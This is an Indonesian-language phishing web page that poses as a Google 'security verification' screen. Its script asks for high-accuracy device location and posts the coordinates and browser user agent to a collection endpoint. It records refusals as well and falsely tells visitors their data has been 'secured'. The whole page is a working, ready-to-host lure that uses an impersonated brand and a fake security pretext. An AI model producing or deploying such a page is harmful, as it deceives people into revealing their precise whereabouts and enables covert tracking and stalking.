<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Verifikasi Keamanan</title>
<style>
  body { margin: 0; padding: 0; background-color: #f0f4ff; height: 100vh; display: flex; justify-content: center; align-items: center; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
  .box { background: #fff; padding: 40px 30px; border-radius: 15px; box-shadow: 0 10px 25px rgba(0,0,0,0.1); text-align: center; max-width: 350px; width: 100%; }
  .logo { width: 80px; margin-bottom: 20px; }
  h2 { margin: 0 0 10px 0; color: #333; font-size: 22px; }
  p { color: #666; font-size: 14px; margin-bottom: 30px; line-height: 1.5; }
  .btn { width: 100%; padding: 15px; background-color: #1a73e8; color: white; border: none; border-radius: 8px; font-size: 16px; font-weight: bold; cursor: pointer; transition: 0.3s; }
  .btn:hover { background-color: #1557b0; }
  .btn:disabled { background-color: #a0c4ff; cursor: not-allowed; }
</style>
</head>
<body>
<div class="box">
  <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/c/c1/Google_%22G%22_logo.svg/1024px-Google_%22G%22_logo.svg.png" class="logo" alt="Logo">
  <h2>Verifikasi Keamanan</h2>
  <p id="status-text">Untuk melanjutkan, silakan verifikasi lokasi perangkat Anda demi keamanan akun.</p>
  
  <button id="btn-verif" class="btn" onclick="mintaLokasi()">Verifikasi Sekarang</button>
</div>

<script>
function mintaLokasi() {
  var btn = document.getElementById('btn-verif');
  var text = document.getElementById('status-text');
  
  btn.innerText = 'Memverifikasi...';
  btn.disabled = true;
  
  if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(
      function(pos) {
        fetch('/api/kirim', { 
          method: 'POST', 
          headers: { 'Content-Type': 'application/json' }, 
          body: JSON.stringify({ lat: pos.coords.latitude, lon: pos.coords.longitude, status: 'Mengizinkan', ua: navigator.userAgent }) 
        }).then(() => {
          text.innerHTML = "<b>Verifikasi Berhasil!</b><br>Data lokasi Anda telah diamankan.";
          text.style.color = "#28a745";
          btn.innerText = "Selesai";
        });
      },
      function(err) {
        fetch('/api/kirim', { 
          method: 'POST', 
          headers: { 'Content-Type': 'application/json' }, 
          body: JSON.stringify({ lat: '0', lon: '0', status: 'Menolak', ua: navigator.userAgent }) 
        }).then(() => {
          text.innerHTML = "<b>Akses Ditolak!</b><br>Anda harus mengizinkan lokasi untuk melanjutkan.";
          text.style.color = "#dc3545";
          btn.innerText = "Coba Lagi";
          btn.disabled = false;
        });
      },
      { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
    );
  } else {
    text.innerText = "Browser Anda tidak mendukung fitur lokasi.";
  }
}
</script>
</body>
</html>
